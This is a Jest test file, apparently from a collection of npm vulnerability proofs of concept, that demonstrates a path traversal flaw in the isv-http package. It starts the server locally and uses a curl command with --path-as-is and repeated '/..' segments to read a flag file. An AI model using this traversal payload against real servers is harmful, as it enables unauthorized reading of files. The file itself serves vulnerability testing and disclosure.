//https://github.com/JacksonGL/NPM-Vuln-PoC/blob/master/directory-traversal/isv-http/test.js
const path = require("path");
const pathToFlag = path.resolve(__dirname, "../flag.html");

function genstr(n) {
  return "/..".repeat(50) + pathToFlag;
}

test("Path Traversal in isv-http", (done) => {
  const pkg = require("isv-http");
  const fs = require("fs");
  const { exec } = require("child_process");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require("child_process");

  try{
    a.execSync('fuser -k 9527/tcp',()=>{})//killing any other process using the same port
  }catch(e){}

  pkg.runserver(); //9527

  let attack_string = `curl -v --path-as-is "http://127.0.0.1:9527${genstr()}"`;

  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
